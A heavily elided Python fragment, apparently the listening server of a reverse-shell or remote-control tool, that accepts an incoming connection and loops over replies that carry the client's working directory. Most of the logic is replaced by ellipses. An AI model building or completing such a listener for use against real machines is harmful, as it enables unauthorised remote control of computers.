...
def connect():
    ...
    print(f'[Info] Listening for incoming connection on port {port}')
    # Accept Connection
    conn, addr = s.accept()

    print(f'[+] We got a connection from: , {addr}')

    # We Do Not Know The Client's Working Directory
    ...
    # It Means It Contains Client's Current Working Directory
    if ('dir:' in r):
    ...
    while True:
        ...
        # Otherwise If Command Is Not Null
            ...
            r = conn.recv(5120).decode('latin-1')

            # If 'dir:' in Reply? Client Has Sent It's Working Directory
            if ('dir:' in r):
